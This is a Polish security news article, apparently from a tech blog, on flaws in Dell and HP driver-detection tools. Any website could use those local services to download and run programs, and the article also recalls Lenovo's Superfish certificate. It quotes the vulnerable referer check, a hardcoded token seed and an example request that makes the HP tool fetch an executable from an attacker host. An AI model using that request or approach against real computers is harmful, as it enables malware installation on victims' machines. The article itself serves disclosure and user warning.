Zarówno Dell jak i HP posiadają na swoich stronach narzędzie diagnostyczne, które sprawdza jaki dokładnie sprzęt (np. model karty sieciowej) jest używany przez dany komputer. Dzięki temu producent wie, które sterowniki wskazać użytkownikowi. Niestety, programiści Della jak i HP popełnili błędy, które pozwalają atakującemu na ściągnięcie i uruchomienie na systemie ofiary dowolnego programu (także złośliwego). Jak po kryjomu ściągnąć coś na komputer użytkownika Della? Błąd został odkryty przez Toma, który miesiąc temu przeanalizował oprogramowanie Della. Program uruchamiany jest w przeglądarce użytkownika, kiedy ten wejdzie na stronę Della i kliknie w przycisk “detect product“. Kliknięcie powoduje zainstalowanie programu Dell System Detect, który zostaje na komputerze na zawsze i startuje razem z komputerem. Program ten nasłuchuje na porcie localhost:8884 i w teorii pozwala na dostęp do komputera tylko Dellowi. Niestety, na skutek błędu w kodzie, Dell System Detect niezbyt dokładnie sprawdza skąd pochodzą komendy i słucha się instrukcji od każdego, byle tylko w nagłówku Referer lub Orgin żądania znajdowało się słowo kluczowe “dell“. Oto funkcja, która za to odpowiada: public void ProcessRequest(HttpListenerContext context) { String url = ""; if (context.Request.UrlReferrer == null) url = context.Request.Headers["Origin"]; else url = context.Request.UrlReferrer.AbsoluteUri; if (absoluteUri.Contains("dell")) { // process the request } } Jak widać, wystarczy że atakujący zaprosi posiadacza laptopa Della na swoją stronę, np. http://zlastrona.pl/dell i już — dzięki wbudowanej w program poniższej metodzie — będzie w stanie wydać polecenie, które pobierze i zainstaluje w tle dowolny program, np. trojana. public static ServiceResponse DownloadAndAutoInstall(string files) { // Download and execute URL's passed in the files parameter without prompting the user } Do wysłania żądania co prawda potrzebny jest jeszcze token, ale ponieważ wyliczany jest on na podstawie zahardcodowanej wartości (“2f68-48be-a09a-9f9b6424ad85“) łączonej z danymi będących pod kontrolą atakującego, to nie ma najmniejszego problemu, aby token wyliczyć samodzielnie. Podobny problem w laptopach HP W przypadku HP, instalowane narzędzie nosi nazwę HP Support Solutions Framework i posiada możliwość nie tylko odczytywania dowolnych plików i kluczy rejestru na systemie ofiary, ale także — zgadliście — instalowania dowolnego oprogramowania. Znowu więc, odwiedzenie złośliwej strony internetowej sprawi, że posiadacz sprzętu HP, który kiedykolwiek na stronie supportu kliknął na przycisk “Find now“, zostanie zainfekowany. Rozwiązanie HP nasłuchuje na porcie localhost:8092 i przyjmuje żądania, których nagłówek Referer lub Origin kończą się na “hp.com“. Znów więc łatwo można je zespoofować (np. poprzez domenę złehp.com ;-) Przykładowe żądanie to: http://localhost:8092/hpdia/run?RemoteFile=https://hacker.com/messbox.exe&FileTitle=update.exe Jednak w odróżnieniu od Della, instalacja nie odbędzie się w tle — użytkownik musi samodzielnie kliknąć na przycisku instaluj w oknie, które pojawia się po otrzymaniu ww. żądania. Lenovo i tak było pierwsze ;-) Przypadki Della i HP mogą wam się słusznie kojarzyć z fuckupem Lenovo sprzed 2 miesięcy. Przypomnijmy, że bloatware Lenovo o nazwie “SuperFish” instalowany na większości laptopów tej firmy posiadał poważny błąd, który pozwalał każdemu nie tylko podsłuchiwać połączenia HTTPS dowolnego użytkownika laptopa Lenovo, ale także modyfikować ich zawartość. Atak był możliwy ze względu na to, że Lenovo wstrzykiwało do magazynu certyfikatów Windowsa swoje własne CA. Ponieważ na każdym laptopie CA było takie samo, bardzo łatwo można było je wykorzystać do tworzenia poprawnych (choć fałszywych) certyfikatów dla dowolnej domen, a więc wykonywania ataków typu phishing. (certyfikaty te, dzięki wstrzykniętemu CA, nie powodowały ostrzeżeń w przeglądarkach). Zarówno Lenovo, jak i Dell oraz HP poprawiły wersję swoich programów “diagnostycznych”. Jeśli kiedyś je instalowaliście, albo całkiem je usuńcie — albo jeśli z jakiegoś powodu ich potrzebujecie — zaktualizujcie do najnowszych wersji. Ciekawe, czy Tom zabierze się teraz za Asusa i innych producentów…? ,vi.curry